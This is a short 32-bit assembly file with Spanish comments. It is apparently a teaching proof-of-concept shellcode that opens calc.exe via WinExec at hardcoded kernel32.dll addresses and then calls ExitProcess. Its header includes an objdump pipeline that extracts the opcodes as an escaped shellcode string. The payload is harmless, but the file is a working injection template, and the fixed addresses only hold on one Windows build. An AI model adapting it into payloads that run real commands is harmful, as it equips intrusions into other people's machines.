; nasm -f elf32 -o stub_shellcode.o stub_shellcode.asm
; ld -m elf_i386 -o stub_shellcode stub_shellcode.o
; 32-bit linux (Funciona en windows como shellcode)

; Para extraer los opcodes :
; 	objdump -M intel -d stub_shellcode | grep '[0-9a-f]:'|grep -v
;	'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|
;	sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/ˆ/"/'|
;	sed 's/$/"/g'


section .data
	; 	...
section .bss
	;	...
section .text
	global _start			; Debe declararse para el enlazador 

_start:
	xor  ecx, ecx			; '0x00'

	push ecx				; El carácter de terminación de cadena 
	push 0x6578652e			; exe.
	push 0x636c6163			; clac
							; 'c',a','l','c','.','e','x','e',0x0

	mov  eax, esp			; Guardamos el string completo en la pila

	; Llamamos a la función WinExec, y le pasamos los argumentos correspondientes. 
	; UINT WinExec([in] LPCSTR	lpCmdLine, [in] UINT uCmdShow); 
	inc  ecx					; uCmdShow = 1
	push ecx					; uCmdShow *ptr para apilar en la 2da posición (LIFO).

	push eax					; lpCmdLine *ptr para apilar en la 1er posición.

	mov  ebx,  0x774df2ae		; Llamamos a la función WinExec() con la dirección en kernel32.dll

	call ebx		

	; Llamamos a la función ExitProcess
	; void ExitProcess([in] UINT uExitCode);
	xor  eax, eax				; '0x00'
	push eax					;  push NULL

	mov  eax,  0x774abd12		; Llamamos a la función ExitProcess() con la dirección en kernel32.dll
	jmp  eax					; Ejecutamos. 
